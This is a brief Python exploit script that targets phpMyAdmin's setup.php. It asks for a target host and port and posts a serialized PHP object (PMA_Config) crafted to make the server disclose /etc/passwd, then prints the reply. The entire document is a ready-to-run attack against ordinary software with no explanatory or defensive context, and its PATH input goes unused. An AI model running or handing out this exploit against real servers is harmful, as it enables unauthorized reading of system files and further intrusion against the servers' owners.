import requests

RHOST=input("RHOST:")
RPORT=input("RPORT:")
PATH=input("PATH:")
headers={"Content-Type": "application/x-www-form-urlencoded"}
#proxies={"http":"http://127.0.0.1:8080"}
data="""action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}"""

res=requests.post(f"http://{RHOST}:{RPORT}/scripts/setup.php",data=data,headers=headers)

print(res.text)
